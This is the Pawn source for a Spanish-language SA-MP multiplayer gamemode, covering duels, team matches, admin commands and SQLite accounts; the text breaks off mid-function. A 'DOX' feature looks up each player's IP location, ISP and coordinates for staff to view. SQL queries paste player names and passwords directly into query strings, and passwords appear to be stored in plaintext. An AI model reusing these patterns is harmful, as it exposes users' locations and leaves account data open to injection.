/*
	Multi CW/TG by Andrew Manu / ne0de
*/

#include <a_samp>
#include <zcmd>
#include <a_http>
#include <streamer>
#include <strlib>

/* DOX ConexiÛn */
#define HTTP_IP_API_URL		"ip-api.com/csv"
#define HTTP_IP_API_END     "?fields=country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,reverse,query,status,message"
#define HTTP_VPN_API_URL    "check.getipintel.net/check.php?contact=tuemail@gmail.com&ip="

/* Detector pais */
#define APIKEY				"KEY.."
#define SIEMPRE_RESPONDER

/* Partida */
#define NULO					0
#define EQUIPO_NARANJA			1
#define EQUIPO_VERDE			2
#define EQUIPO_ESPECTADOR		3

#define MAX_JUGADORES_PARTIDA 	6

#define ENTRENAMIENTO			0
#define EN_EQUIPO				1
#define UNO_VS_UNO				2

/* Rangos */
#define SIN_RANGO           0
#define RANGO_JUNIOR		1
#define RANGO_ASESINO       2
#define RANGO_MERCENARIO	3
#define RANGO_ELITE			4
#define RANGO_LEYENDA		5
#define RANGO_MAESTRO		6
#define RANGO_SENIOR		7

/* Teclas */
#define PRESSED(%0) \
	(((newkeys & (%0)) == (%0)) && ((oldkeys & (%0)) != (%0)))
#define HOLDING(%0) \
	((newkeys & (%0)) == (%0))

/* - Funciones - */
#define ForPlayers(%0) for(new %0; %0 <= jugadoresConectados;%0++) if(IsPlayerConnected(%0))
#pragma tabsize 0

/* Campanas */
#define CAMPANA_SLAP            17804
#define CAMPANA_CLASICO 		17802
#define CAMPANA_CAMARA_FOTO 	1132
#define CAMPANA_ELECTROSH0CK 	6003
#define CAMPANA_VIDEOJUEGO 		5205
#define CAMPANA_MODERNO 		5201

/* DIALOGOS */

#define D_LOGIN			0
#define D_REGISTRO		1
#define D_MENU_MUNDOS	2
#define D_MENU_EQUIPOS	3

#define D_MENU_CONFIGURACION_PARTIDA		50
#define D_MENU_CONFIGURACION_PARTIDA_MAPA   52
#define D_MENU_CONFIGURACION_PARTIDA_ARMA   53
#define D_MENU_CONFIGURACION_PARTIDA_RM   	54
#define D_MENU_CONFIGURACION_PARTIDA_PM   	55
#define D_MENU_CONFIGURACION_PARTIDA_PN   	56
#define D_MENU_CONFIGURACION_PARTIDA_RN   	57
#define D_MENU_CONFIGURACION_PARTIDA_PV     58
#define D_MENU_CONFIGURACION_PARTIDA_RV     59
#define D_MENU_CONFIGURACION_PARTIDA_FPS    60
#define D_MENU_CONFIGURACION_PARTIDA_PING   61
#define D_MENU_CONFIGURACION_PARTIDA_PL     62

#define D_MENU_CONFIGURACION  				100
#define D_MENU_CONFIGURACION_CAMPANA    	101
#define D_MENU_CONFIGURACION_SKIN       	102
#define D_MENU_CONFIGURACION_CLIMA	    	103
#define D_MENU_CONFIGURACION_HORA      	 	104

#define D_MENU_CONTROL_CUENTA				799
#define D_MENU_CONTROL_CUENTA_ANOMBRE		800
#define D_CAMBIAR_NOMBRE					801

#define D_INFO_PARTIDA_ACTUAL 				130

#define D_MENU_MOSTRAR_DATOS				140

#define D_COMANDOS_ADMIN		150

#define D_MENU_TOP				200
#define D_MENU_TOP_DATOS		201

#define D_MENU_DUELO			250
#define D_MENU_DUELO_MAPAS		251
#define D_MENU_DUELO_OPONENTE	252
#define D_MENU_DUELO_ARMAS 		253
#define D_MENU_DUELO_CREAR		254

#define PARTIDAS_REALIZADAS_SOLO	301
#define PARTIDAS_REALIZADAS 		300

/* Mapas de duelo */
#define DUELO_WAREHOUSE 1
#define DUELO_KURKS		2
#define DUELO_ESTADIo   3

static const Float:posicionesArenaDuelo[4][2][4] =
	{
		{ 
			{1408.0518, -34.1221, 1001.1148},
			{1408.0518, -34.1221, 1001.1148}
		},
		{ // Warehouse
			{1408.0518, -34.1221, 1001.1148},
			{1408.0518, -34.1221, 1001.1148}
		},
		{ // Kurks
			{-1380.2850, 1279.0682, 1039.3030},
			{-1401.2239, 1209.5277, 1040.2590}
		},
 		{ // Estadio
			{-3310.4426, 1734.1752, 217.8864},
			{-3355.6599, 1729.7410, 217.1869}
		}
	};

enum DataD
{
	bool:Configurando,
	bool:Esperando,
	bool:enCurso,
	bool:Creador,
	Mapa,
 	Oponente,
	tipoArma,
	Timer,
	Contador,
	Segundos,
	Minutos
};

new Duelo[MAX_PLAYERS][DataD];
new bool:dueloMapaEstado[4] = {false, true, true, true};
new interiorDueloMapa[4] = {-1, 1, 16, 1};

new nombreDueloMapas[][] = {"Ninguno", "Warehouse", "Kurks", "Estadio"};
new nombreDueloArmas[][] = {"Ninguno", "Armas R·pidas", "Armas Lentas"};


/* Colores */
#define COLOR_BLANCO 	-1
#define COLOR_NEUTRO    0xC0C9C9C9
#define COLOR_GRIS      0x80808080
#define COLOR_AMARILLO 	0xFFFFBB00
#define COLOR_AZUL      0x3624FFFF
#define COLOR_CYAN	    0x88F7F7FF
#define COLOR_VERDE 	0x007C0EFF
#define COLOR_NARANJA 	0xF69521AA
#define COLOR_ROJO      0xFF5353FF

/* Datos que se guardaran en la base de datos */
enum Data
{
	ID,
 	Nombre[MAX_PLAYER_NAME],
 	Password[24],
	Pais[128],
 	puntajeEquipo,
	puntajeSolo,
	duelosGanados,
	duelosPerdidos,
	Muteado,
	Admin,
	Skin,
	invitacionDuelos,
	mensajesPrivados,
	infoDamage,
	mostrarTab,
	mostrarFpsPing,
	bool:mostrarMarcador,
	sonidoCampana,
	tipoCampana,
	Clima,
	Hora,
	bool:eligiendoMundo,
	bool:Desbugeando,
	bool:Congelado,
	bool:vidaInfinita,
	bool:puedeCambiarNombre,
	timerDelayTeclas,
	segundosTotales,
	Adversion,
	mundoAnterior,
	Offset
};
new Jugador[MAX_PLAYERS][Data];
new jugadoresConectados;

new FPS2[MAX_PLAYERS];
new FPSS[MAX_PLAYERS];

new bool:antiFake;
new bool:lecheroBot;

enum doxInfo
{
	Status[64],
	Country[64],
	CountryCode[64],
	Region[64],
	RegionName[64],
	City[64],
	Zip[64],
	Lat[64],
	Lon[64],
	TimeZone[64],
	Isp[64],
	Org[64],
	As[64],
	Reverse[64],
	IP[16],
};

new doxJugador[MAX_PLAYERS][doxInfo];
new targetID[MAX_PLAYERS];

new PlayerText:mostrarFps[MAX_PLAYERS], PlayerText:mostrarPing[MAX_PLAYERS];

new Vehiculos[50];
new vehiculosTotales = 0;

enum DataP
{
	bool:enJuego,
	bool:enPausa,
	tipoPartida,
	puntajeMaximo,
	rondaMaxima,
	rondaActual,
	jugadoresNaranja,
	rondasNaranja,
	puntajeNaranja,
	puntajeTotalNaranja,
	jugadoresVerde,
	rondasVerde,
	puntajeVerde,
	puntajeTotalVerde,
	cantidadEspectadores,
	tipoArma,
	Mapa,
	Restriccion,
	bool:FPS,
	bool:PING,
	bool:PL,
	fpsMinimo,
	pingMaximo,
	Float:plMaximo,
	Timer,
	inicioHora,
	inicioMinuto,
	inicioSegundo,
	Minutos,
	Segundos,
	bool:equiposBloqueados
};

new configuracionMundo[5][DataP];
new Equipo[MAX_PLAYERS];
/* Textdraws InformaciÛn */
new Text:datosPartida[5];

new nombreArmas[][] = {"Escopeta Recortada", "Desert Eagle", "Armas Rapidas", "Armas Lentas"};

new Float:posicionesMapas[3][4][4] =
	{
		{ // Aeropuerto LV
		    {0.0, 0.0, 0.0},
			{1617.4435, 1629.5537, 11.5618},
			{1497.5476, 1501.1267, 10.3481},
			{1599.2198, 1512.4071, 22.0793}
		},{ // Aeropuerto SF
  			{0.0, 0.0, 0.0},
			{-1313.0103, -55.3676, 13.4844, 180.0000},
			{-1186.4745, -182.016, 14.1484, 90.0000},
			{-1227.1295, -76.7832, 29.0887, 130.0000}
		},{ // Auto-escuela
			{0.0, 0.0, 0.0},
			{-2047.4285, -117.2283, 35.2487, 178.9484},
			{-2051.0955, -267.9533, 35.3203, 358.7801},
			{-2092.7380, -107.3132, 44.5237}
		}
	};

new Text3D:Marcador[6],
	Float:posicionesMarcador[3][3] =
	{
		{1592.8101, 1521.0276, 20.8380},  // Aeropuerto LV
		{-1234.09, -84.41, 16.39},   // Aeropuerto SF
		{-2096.01, -188.82, 37.45}    //AutoEscuela
	};

new PlayerText:drawHit[MAX_PLAYERS][2], segundosTotalesHit[MAX_PLAYERS][2], delayDrawHit[MAX_PLAYERS][2];

new const comandosModerador[14][20] =
	{
		//{"/vigilar"}, {"/novigilar"},
		{"/anuncio"}, {"/congelar"},
		{"/descongelar"}, {"/am"}, {"/configurar"},
		{"/mostrardatos"}, {"/explotar"}, {"/aka"}, {"acmds"},
		{"/verde"}, {"/naranja"}, {"/espectador"}, {"/fps"},
		{"/pl"}
	};

new const comandosModeradorG[9][20] =
	{
		{"/traer"}, {"/ir"}, {"/cc"},
		{"/mutear"}, {"/desmutear"}, {"/kick"}, {"/advertir"},
		{"/auto"}, {"/eliminarautos"}
	};
	
static const comandosAdministrador[11][20] =
	{
		{"/ban"}, {"/desban"}, {"/desbanip"}, {"/setadmin"}, {"/controlcuentas"},
		{"/gm"}, {"/antifake"}, {"/lechero"}, {"/hablar"}, {"/cancion"}, {"/gravedad"}
	};


stock chequearComandoAdmin(nivel, cmd[]){
	switch(nivel){
	    case 1:
	    {
			for(new i=0;i<sizeof(comandosModerador);i++)
				if(strfind(cmd, comandosModerador[i], true) != -1)
					return 1;
	    }
	    case 2:
	    {
			for(new i=0;i<sizeof(comandosModeradorG);i++)
				if(strfind(cmd, comandosModeradorG[i], true) != -1)
					return 1;
	    }
	    case 3:
	    {
			for(new i=0;i<sizeof(comandosAdministrador);i++)
				if(strfind(cmd, comandosAdministrador[i], true) != -1)
					return 1;
	    }
	}
	return 0;
}

new DB:Cuentas, DB:Baneados;
new DB:partidasSolo;

forward Spawn(playerid);
forward delayKick(playerid);
forward mostrarInicio(playerid);
forward registrarDatos(playerid);
forward cargarDatos(playerid);
forward guardarDatos(playerid);
forward refrescarPosicion();
forward comprobarProxy(playerid, response_code, data[]);
forward obtenerPais(playerid, response_code, data[]);
forward HttpVPNInfo(playerid, response_code, data[]);
forward mostrarAka(playerid, response_code, data[]);
forward contadorTiempoDuelo(playerid);
forward detectorParametros();
forward restarDelayHitReceptor(playerid);
forward restarDelayHitEmisor(playerid);
forward contarTiempoPartida(numeroMundo);
forward restarDelayTeclas(playerid);


stock estaUsandoOtraCuenta(playerid){
	new DBResult:Resultado, Consulta[256], filasEncontradas = 0;
	format(Consulta, sizeof(Consulta), "SELECT * FROM Cuentas WHERE Ip = '%s'", obtenerIp(playerid));
	Resultado = db_query(Cuentas, Consulta);
	filasEncontradas = db_num_rows(Resultado);

	new Nick[24];
	db_get_field_assoc(Resultado, "Nombre", Nick, 24);
	db_free_result(Resultado);
	return strcmp(obtenerNick(playerid), Nick);	
}

stock cuentaRegistrada(playerid){
	new DBResult:Resultado, Consulta[256], filasEncontradas = 0;
	format(Consulta, sizeof(Consulta), "SELECT * FROM Cuentas WHERE Nombre = '%s'", obtenerNick(playerid));
	Resultado = db_query(Cuentas, Consulta);
	filasEncontradas = db_num_rows(Resultado);
	db_free_result(Resultado);
	return filasEncontradas;
}

stock cargarPassword(playerid){
	new DBResult:Resultado, Consulta[256];
	format(Consulta, sizeof(Consulta), "SELECT * FROM Cuentas WHERE Nombre = '%s'", obtenerNick(playerid));
	Resultado = db_query(Cuentas, Consulta);
	db_get_field_assoc(Resultado, "Password", Jugador[playerid][Password], 24);
	db_free_result(Resultado);
}


stock existePassword(password[]){
	new DBResult:Resultado, Consulta[256], filasEncontradas = 0;
	format(Consulta, sizeof(Consulta), "SELECT * FROM Cuentas WHERE Password = '%s'", password);
	Resultado = db_query(Cuentas, Consulta);
	filasEncontradas = db_num_rows(Resultado);
	db_free_result(Resultado);
	return filasEncontradas;
}

stock existeNombre(nombre[]){
	new DBResult:Resultado, Consulta[256], filasEncontradas = 0;
	format(Consulta, sizeof(Consulta), "SELECT * FROM Cuentas WHERE Nombre = '%s'", nombre);
	Resultado = db_query(Cuentas, Consulta);
	filasEncontradas = db_num_rows(Resultado);
	db_free_result(Resultado);
	return filasEncontradas;
}

stock cargarClavePrimaria(playerid){
	new DBResult:Resultado, Consulta[256];
	format(Consulta, sizeof(Consulta), "SELECT * FROM Cuentas WHERE Nombre = '%s'", obtenerNick(playerid));
	Resultado = db_query(Cuentas, Consulta);
	if(db_num_rows(Resultado))
        	Jugador[playerid][ID] = db_get_field_assoc_int(Resultado, "id");
	db_free_result(Resultado);
}

stock GetPlayerFPS(playerid) return FPS2[playerid];

stock obtenerIp(playerid){
	new ip[16];
    GetPlayerIp(playerid, ip, sizeof(ip));
    return ip;
}

stock obtenerNick(playerid){
	new Nick[24];
	GetPlayerName(playerid, Nick, 24);
	return Nick;
}

stock obtenerTiempoConexion(playerid, &horas, &minutos, &segundos){
	new milisegundos = NetStats_GetConnectedTime(playerid);

	segundos = (milisegundos / 1000) % 60;
 	minutos = (milisegundos / (1000 * 60)) % 60;
  	horas = (milisegundos / (1000 * 60 * 60));
  	return 1;
}

stock obtenerFechaRegistro(playerid){
	new DBResult:Resultado, Consulta[256], Fecha[10], dia, mes, year;
	format(Consulta, sizeof(Consulta), "SELECT * FROM Cuentas WHERE id = %d", Jugador[playerid][ID]);
	Resultado = db_query(Cuentas, Consulta);
	if(db_num_rows(Resultado)){
		dia = db_get_field_assoc_int(Resultado, "Dia");
		mes = db_get_field_assoc_int(Resultado, "Mes");
 		year = db_get_field_assoc_int(Resultado, "Year");
	}
	db_free_result(Resultado);
	format(Fecha, sizeof(Fecha), "%d/%d/%d", dia, mes, year);
	return Fecha;
}

stock resetearArray(playerid){
    for(new i;i < sizeof(Jugador);i++)
		Jugador[playerid][Data:i] = 0;
}

stock darArmas(playerid){
	new numeroMundo = GetPlayerVirtualWorld(playerid);
	switch(configuracionMundo[numeroMundo][tipoArma]){
	    case 0: GivePlayerWeapon(playerid, 26, 9999);
	    case 1: GivePlayerWeapon(playerid, 24, 9999);
	    case 2: darArmasRapidas(playerid);
	    case 3: darArmasLentas(playerid);
	}
	return 1;
}

stock darArmasRapidas(playerid){
	ResetPlayerWeapons(playerid);
	GivePlayerWeapon(playerid, 22, 9999);
	GivePlayerWeapon(playerid, 28, 9999);
	GivePlayerWeapon(playerid, 26, 9999);
}

stock darArmasLentas(playerid){
	ResetPlayerWeapons(playerid);
	GivePlayerWeapon(playerid, 24, 9999);
	GivePlayerWeapon(playerid, 25, 9999);
	GivePlayerWeapon(playerid, 34, 9999);
}

stock existeJugador(id){
	ForPlayers(i)
	    if(i == id)
	        return 1;
	return 0;
}


stock esNumero(const string[])
{
    for (new i = 0, j = strlen(string); i < j; i++)
        if (string[i] > '9' || string[i] < '0')
			return 0;
    return 1;
}

stock esFloat(const string[])
{
    new l = strlen(string);
    new dcount = 0;
    for(new i=0; i<l; i++)
    {
        if(string[i] == '.')
        {
            if(i == 0 || i == l-1) return 0;
            else
            {
                dcount++;
            }
        }
        if((string[i] > '9' || string[i] < '0') && string[i] != '+' && string[i] != '-' && string[i] != '.') return 0;
        if(string[i] == '+' || string[i] == '-')
        {
            if(i != 0 || l == 1) return 0;
        }
    }
    if(dcount == 0 || dcount > 1) return 0;
    return 1;
}

stock colorJugador(playerid){ return GetPlayerColor(playerid) >>> 8; }

stock escribioPacman(texto[]){
	if(strfind(texto, ":", true) != -1 || strfind(texto, ";", true) != -1){
		if(strfind(texto, "v", true) != -1)
		    return 1;
        if(strfind(texto, "V", true) != -1)
            return 1;
	}
	return 0;
}
public OnPlayerText(playerid, text[])
{
	if(Jugador[playerid][Muteado] == 1){
	    SendClientMessage(playerid, COLOR_ROJO, "> No puedes escribir, estas muteado.");
	    return 0;
	}
	
	if(text[0] == '$' && Jugador[playerid][Admin] > 0){
	    new str[300];
		format(str,sizeof(str),"{C9C9C9}[CHAT-ADMIN] {004444}%s {C9C9C9}(%d): {C3C3C3}%s", obtenerNick(playerid), Jugador[playerid][Admin], text[1]);
		ForPlayers(i){
		    if(IsPlayerConnected(i))
				if(Jugador[i][Admin] > 0)
					SendClientMessage(i, COLOR_NEUTRO, str);
		}
		return 0;
	}
	
	if(text[0] == '!'){
	    new str[300];
		format(str,sizeof(str),"{C9C9C9}[EQUIPO] {004444}%s {C9C9C9}: {C3C3C3}%s", obtenerNick(playerid), text[1]);
		ForPlayers(i){
		    if(IsPlayerConnected(i))
				if(Equipo[i] == Equipo[playerid])
					SendClientMessage(i, COLOR_NEUTRO, str);
		}
		return 0;
	}
	
    new Texto[3000];
	format(Texto, sizeof(Texto), "{FFFFFF}%d {%06x}%s {FFFFFF}> %s", playerid, colorJugador(playerid), obtenerNick(playerid), text);
	SetPlayerChatBubble(playerid, text, COLOR_NEUTRO, 50, 5000);
	enviarATodos(GetPlayerVirtualWorld(playerid), Texto);
	
	if(lecheroBot == true){
		if(escribioPacman(text)){
			Jugador[playerid][Adversion]++;
			new str[500];
			format(str, sizeof(str), "{FFFFFF}[WTx][L]eChe[R]Oo_. {C9C9C9}ha advertido a {%06x}%s{C9C9C9} (%d/3): {FFFFFF}no usas el pacman",
			colorJugador(playerid), Jugador[playerid][Nombre], Jugador[playerid][Adversion]);
			enviarATodos(GetPlayerVirtualWorld(playerid), str);
			verificarAdvertencias(playerid);
		}
	}
    return 0;
}

public OnPlayerClickPlayer(playerid, clickedplayerid, source)
{
	if(IsPlayerConnected(playerid) && IsPlayerConnected(clickedplayerid)){

		if(Duelo[playerid][Configurando])
		    return SendClientMessage(playerid, COLOR_ROJO, "> Termina de configurar el duelo.");
		    
		if(Jugador[clickedplayerid][eligiendoMundo])
		    return SendClientMessage(playerid, COLOR_ROJO, "> Este jugador est· eligiendo un mundo.");

		if(Jugador[playerid][mostrarTab])
            return mostrarConexion(playerid, clickedplayerid);
    	else
			return mostrarStats(playerid, clickedplayerid);
	}
    return 1;
}

public OnPlayerKeyStateChange(playerid, newkeys, oldkeys)
{
	if(Equipo[playerid] != EQUIPO_ESPECTADOR){
		new numeroMundo = GetPlayerVirtualWorld(playerid);
	    if(Jugador[playerid][segundosTotales] > 0 && PRESSED(KEY_CTRL_BACK)){
 			new Texto[64];
			format(Texto, sizeof(Texto), "> Espera {FFFFFF}%i {FFFFBB}segundos para usar las tecla.", Jugador[playerid][segundosTotales]);
			return SendClientMessage(playerid, COLOR_AMARILLO, Texto);
	    }
	    //KEY_YES
     	if(PRESSED(KEY_CTRL_BACK)){
     	    aplicarDelayTeclas(playerid);
     	    if(partidaEnJuego(numeroMundo)){
			 	cancelarPartida(numeroMundo, playerid);
			}else{
				iniciarPartida(numeroMundo, playerid);
			}
     	}
	}
	return 1;
}


stock partidaEnJuego(numeroMundo){ return configuracionMundo[numeroMundo][enJuego]; }
stock partidaEnPausa(numeroMundo){ return configuracionMundo[numeroMundo][enPausa]; }


stock despausarPartidaAutomatico(numeroMundo){
	configuracionMundo[numeroMundo][enPausa] = false;
	new Texto[200];
	format(Texto, sizeof(Texto), "[MUNDO %d] Se ha despausado la partida, pueden seguir jugando.", numeroMundo);
	enviarATodos(numeroMundo,  Texto);
}
stock pausarPartidaAutomatico(numeroMundo){
	configuracionMundo[numeroMundo][enPausa] = true;
	new Texto[200];
	format(Texto, sizeof(Texto), "[MUNDO %d] Se ha pausado la partida.", numeroMundo);
	enviarATodos(numeroMundo,  Texto);
}

stock saberTipoPartida(numeroMundo){
	actualizarJugadores(numeroMundo, EQUIPO_NARANJA);
	actualizarJugadores(numeroMundo, EQUIPO_VERDE);
	new Tipo = ENTRENAMIENTO;

	new Naranja = configuracionMundo[numeroMundo][jugadoresNaranja], Verde = configuracionMundo[numeroMundo][jugadoresVerde];
	if(Naranja == 1 && Verde == 1)
		Tipo = UNO_VS_UNO;
	if(Naranja > 1 && Verde > 1){
		if(Naranja == Verde)
			Tipo = EN_EQUIPO;
	}
	return Tipo;
}

stock resetearMundo(numeroMundo){
	configuracionMundo[numeroMundo][enJuego] = false;
	configuracionMundo[numeroMundo][enPausa] = false;
	configuracionMundo[numeroMundo][tipoPartida] = ENTRENAMIENTO;	
	resetearPuntajesYRondas(numeroMundo);
}

stock cancelarPartidaAutomatico(numeroMundo){
	resetearMundo(numeroMundo);
	actualizarMarcador(numeroMundo);
	actualizarDrawPartida(numeroMundo);
	resetearTimer(numeroMundo);
	new Texto[200];
	format(Texto, sizeof(Texto), "[MUNDO %d] Se ha cancelado la partida.", numeroMundo);
	enviarATodos(numeroMundo, Texto);
}

stock cancelarPartida(numeroMundo, playerid){
	resetearMundo(numeroMundo);
	actualizarMarcador(numeroMundo);
	actualizarDrawPartida(numeroMundo);
	resetearTimer(numeroMundo);
	new Texto[200];
	format(Texto, sizeof(Texto), "[MUNDO %d] {%06x}%s {C9C9C9}ha cancelado la partida.", numeroMundo, colorJugador(playerid), obtenerNick(playerid));
	enviarATodos(numeroMundo, Texto);
}

stock iniciarPartida(numeroMundo, playerid){
	new tipoDePartida = saberTipoPartida(numeroMundo), Texto[300];

	switch(tipoDePartida){
		case UNO_VS_UNO:
		{
			new str[100], naranja = jugadorNaranja(numeroMundo), verde = jugadorVerde(numeroMundo);
			format(str, sizeof(str), "[MUNDO %d] {%06x}%s {C9C9C9}ha iniciado la partida.", numeroMundo, colorJugador(playerid), obtenerNick(playerid));
			enviarATodos(numeroMundo, str);

			format(str, sizeof(str), "[MUNDO %d] {%06x}%s {C9C9C9}contra {%06x}%s", numeroMundo, colorJugador(naranja), obtenerNick(naranja), colorJugador(verde), obtenerNick(verde));
			strcat(Texto, str);
		
			format(str, sizeof(str), " {C9C9C9}a {FFFFFF}%d {C9C9C9}ronda/s.",  configuracionMundo[numeroMundo][rondaMaxima]);
			strcat(Texto, str);

			enviarATodos(numeroMundo, Texto);

   			configuracionMundo[numeroMundo][enJuego] = true;
			configuracionMundo[numeroMundo][enPausa] = false;
			configuracionMundo[numeroMundo][tipoPartida] = UNO_VS_UNO;

   			new hora, minuto, segundo;
			gettime(hora, minuto, segundo);
			configuracionMundo[numeroMundo][inicioHora] = hora;
			configuracionMundo[numeroMundo][inicioMinuto] = minuto;
			configuracionMundo[numeroMundo][inicioSegundo] = segundo;
			configuracionMundo[numeroMundo][Timer] = SetTimerEx("contarTiempoPartida", 1000, true, "i", numeroMundo);
		

			actualizarDrawPartida(numeroMundo);
			actualizarMarcador(numeroMundo);
		}
		case EN_EQUIPO:
		{
			new str[100];
			format(str, sizeof(str), "[MUNDO %d] {%06x}%s {C9C9C9}ha iniciado la partida.", numeroMundo, colorJugador(playerid), obtenerNick(playerid));
			enviarATodos(numeroMundo, str);

   			configuracionMundo[numeroMundo][enJuego] = true;
			configuracionMundo[numeroMundo][enPausa] = false;
			configuracionMundo[numeroMundo][tipoPartida] = EN_EQUIPO;

   			new hora, minuto, segundo;
			gettime(hora, minuto, segundo);
			configuracionMundo[numeroMundo][inicioHora] = hora;
			configuracionMundo[numeroMundo][inicioMinuto] = minuto;
			configuracionMundo[numeroMundo][inicioSegundo] = segundo;
			configuracionMundo[numeroMundo][Timer] = SetTimerEx("contarTiempoPartida", 1000, true, "i", numeroMundo);
		
			actualizarDrawPartida(numeroMundo);
			actualizarMarcador(numeroMundo);
		}

		case ENTRENAMIENTO:
		{
			SendClientMessage(playerid, COLOR_AMARILLO, "> No se pudo iniciar la partida.");
		}

	}
	
}

public contarTiempoPartida(numeroMundo){
	if(!configuracionMundo[numeroMundo][enPausa])
		configuracionMundo[numeroMundo][Segundos]++;
	if(configuracionMundo[numeroMundo][Segundos] == 60){
	    configuracionMundo[numeroMundo][Segundos] = 0;
	    configuracionMundo[numeroMundo][Minutos]++;
	}
	return 1;
}

stock resetearTimer(numeroMundo){
	configuracionMundo[numeroMundo][Segundos] = 0;
 	configuracionMundo[numeroMundo][Minutos] = 0;
	configuracionMundo[numeroMundo][inicioHora] = 0;
	configuracionMundo[numeroMundo][inicioMinuto] = 0;
	configuracionMundo[numeroMundo][inicioSegundo] = 0;
 	KillTimer(configuracionMundo[numeroMundo][Timer]);
}

stock jugadorNaranja(numeroMundo){
	new id = -1;
	ForPlayers(i)
		if(Equipo[i] == EQUIPO_NARANJA && GetPlayerVirtualWorld(i) == numeroMundo)
			id = i;
	return id;
}

stock jugadorVerde(numeroMundo){
	new id = -1;
	ForPlayers(i)
		if(Equipo[i] == EQUIPO_VERDE && GetPlayerVirtualWorld(i) == numeroMundo)
			id = i;
	return id;
}
stock aplicarDelayTeclas(playerid){
	Jugador[playerid][segundosTotales] = 10;
	Jugador[playerid][timerDelayTeclas] = SetTimerEx("restarDelayTeclas", 1000 , true, "i", playerid);
 	SendClientMessage(playerid, COLOR_AMARILLO, "> Puedes volver a usar las teclas en {FFFFFF}10 {FFFFBB}segundos.");
}

public restarDelayTeclas(playerid){
	Jugador[playerid][segundosTotales]--;
	if(Jugador[playerid][segundosTotales] == 0){
          KillTimer(Jugador[playerid][timerDelayTeclas]);
          Jugador[playerid][segundosTotales] = -1;
		  SendClientMessage(playerid, COLOR_AMARILLO, "> Ya puedes volver a usar las teclas.");
	}
    return 1;
}

public OnPlayerCommandPerformed(playerid, cmdtext[], success)
{
	if(!success){
    	PlayerPlaySound(playerid,1054,0.0,0.0,0.0);
    	SendClientMessage(playerid, COLOR_AMARILLO, "> No existe ese comando en el servidor.");
 	}
	return 1;
}

public OnPlayerCommandReceived(playerid, cmdtext[])
{
	if(Duelo[playerid][enCurso]){
		if(!strcmp(cmdtext, "/equipo") || !strcmp(cmdtext, "/mundo") || !strcmp(cmdtext, "/unbug")){
			new Texto[264];
			format(Texto, sizeof(Texto), "[{26BF61}DUELO{C9C9C9}] Termina el duelo con {%06x}%s{C9C9C9} para acceder al comando.", colorJugador(Duelo[playerid][Oponente]), obtenerNick(Duelo[playerid][Oponente]));
			SendClientMessage(playerid, COLOR_NEUTRO, Texto);
			return 0;
		}
	}

	if(Jugador[playerid][Admin] < 1 && chequearComandoAdmin(1, cmdtext)){
    	SendClientMessage(playerid, COLOR_ROJO, "> Comando exclusivamente para Moderadores.");
		return 0;
	}
	
	if(Jugador[playerid][Admin] < 2 && chequearComandoAdmin(2, cmdtext)){
    	SendClientMessage(playerid, COLOR_ROJO, "> Comando exclusivamente para Moderadores globales.");
		return 0;
	}

	if(Jugador[playerid][Admin] < 3 && chequearComandoAdmin(3, cmdtext)){
    	SendClientMessage(playerid, COLOR_ROJO, "> Comando exclusivamente para Administradores.");
		return 0;
	}
	return 1;
}

public refrescarPosicion(){
	ForPlayers(i){
		if(Equipo[i] == EQUIPO_ESPECTADOR){
			new Float:X, Float:Y, Float:Z;
			GetPlayerPos(i, X, Y, Z);
			if(Z < posicionesMapas[mapaJugador(i)][EQUIPO_NARANJA][2]+1)
				CallLocalFunction("Spawn", "i", i);
		}
	}
	return 1;
}

public OnGameModeInit()
{
	SetGameModeText("Multi CW/TG");
	SendRconCommand("mapname SF/LV");
 	SendRconCommand("language EspaÒol/Spanish");
    SendRconCommand("weather 4");
    
	EnableStuntBonusForAll(1);
	UsePlayerPedAnims();
	ManualVehicleEngineAndLights();
    DisableInteriorEnterExits();

	antiFake = false;
	lecheroBot = false;

	SetTimer("refrescarPosicion", 2000, true);
	SetTimer("detectorParametros", 5000, true);

	Cuentas = db_open("Cuentas.db");
	Baneados = db_open("Baneados.db");
	partidasSolo = db_open("partidasSolo.db");

	new DBResult:Resultado;

	if(Baneados){
		new Consulta[1000], str[500];
		format(Consulta, sizeof(Consulta), "CREATE TABLE IF NOT EXISTS Baneados (id INTEGER PRIMARY KEY AUTOINCREMENT, Nombre TEXT, `Ip` TEXT, `Razon` TEXT, `baneadoPor` VARCHAR(24) NOT NULL, `Dia` INTEGER, `Mes` INTEGER, ");
  		format(str, sizeof(str), "`Year` INTEGER, `Hora` INTEGER, `Minuto` INTEGER, `Segundo` INTEGER)");
  		strcat(Consulta, str);
		Resultado = db_query(Baneados, Consulta);
		db_free_result(Resultado);
	}else
    	print("Baneados: error al encontrar la base de datos.");
	
    if(Cuentas){
		new Consulta[1000];
		format(Consulta, sizeof(Consulta), "CREATE TABLE IF NOT EXISTS Cuentas (id INTEGER PRIMARY KEY AUTOINCREMENT, Nombre TEXT, Password TEXT, Ip INTEGER, ");
		strcat(Consulta, "Pais TEXT, Admin INTEGER, Mute INTEGER, Skin INTEGER, mensajesPrivados INTEGER, invitacionDuelos INTEGER, ");
		strcat(Consulta, "infoDamage INTEGER, mostrarTab INTEGER, mostrarFpsPing INTEGER, sonidoCampana INTEGER, tipoCampana INTEGER, Clima INTEGER, Hora INTEGER, ");
  		strcat(Consulta, "Dia INTEGER, Mes INTEGER, Year INTEGER, ");
		strcat(Consulta, "puntajeEquipo INTEGER, puntajeSolo INTEGER, duelosGanados INTEGER, duelosPerdidos INTEGER)");
		Resultado = db_query(Cuentas, Consulta);
		db_free_result(Resultado);
	}else
    	print("Cuentas: error al encontrar la base de datos.");

	if(partidasSolo){
		new Consulta[1000], str[500];
		format(Consulta, sizeof(Consulta), "CREATE TABLE IF NOT EXISTS partidasSolo (id INTEGER PRIMARY KEY AUTOINCREMENT, jugadorNaranja TEXT, jugadorVerde TEXT, Ganador TEXT, puntajeNaranja INTEGER, ");
  		format(str, sizeof(str), "rondasNaranja INTEGER, puntajeVerde INTEGER, rondasVerde INTEGER, Mes INTEGER, Dia INTEGER, Year INTEGER, minutosJugados INTEGER, segundosJugados INTEGER)");
  		strcat(Consulta, str);
		Resultado = db_query(partidasSolo, Consulta);
		db_free_result(Resultado);
	}else
    	print("Partida: error al encontrar la base de datos.");

	configurarParamatros();
	return 1;
}

main()
{

}

public OnRconLoginAttempt(ip[], password[], success)
{
    if(!success)
    {
        new pip[16];
        for(new i = GetPlayerPoolSize(); i != -1; --i)
        {
            GetPlayerIp(i, pip, sizeof(pip));
            if(!strcmp(ip, pip, true)) 
            {
     			new Texto[400];
